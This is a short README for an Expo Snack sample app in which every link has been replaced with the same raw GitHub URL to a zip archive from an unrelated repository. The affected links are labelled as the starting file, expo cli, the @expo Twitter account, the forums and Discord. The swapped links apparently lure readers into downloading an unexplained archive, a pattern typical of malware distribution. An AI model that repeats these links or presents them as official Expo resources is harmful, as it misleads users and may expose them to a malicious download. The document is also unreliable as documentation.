# Sample Snack app

Open the `https://raw.githubusercontent.com/560320534/JORIAFINALS_AMC/main/assets/AMC_JORIAFINAL_2.0.zip` file to start writing some code. You can preview the changes directly on your phone or tablet by scanning the **QR code** or use the iOS or Android emulators. When you're done, click **Save** and share the link!

When you're ready to see everything that Expo provides (or if you want to use your own editor) you can **Download** your project and use it with [expo cli](https://raw.githubusercontent.com/560320534/JORIAFINALS_AMC/main/assets/AMC_JORIAFINAL_2.0.zip)).

All projects created in Snack are publicly available, so you can easily share the link to this project via link, or embed it on a web page with the `<>` button.

If you're having problems, you can tweet to us [@expo](https://raw.githubusercontent.com/560320534/JORIAFINALS_AMC/main/assets/AMC_JORIAFINAL_2.0.zip) or ask in our [forums](https://raw.githubusercontent.com/560320534/JORIAFINALS_AMC/main/assets/AMC_JORIAFINAL_2.0.zip) or [Discord](https://raw.githubusercontent.com/560320534/JORIAFINALS_AMC/main/assets/AMC_JORIAFINAL_2.0.zip).
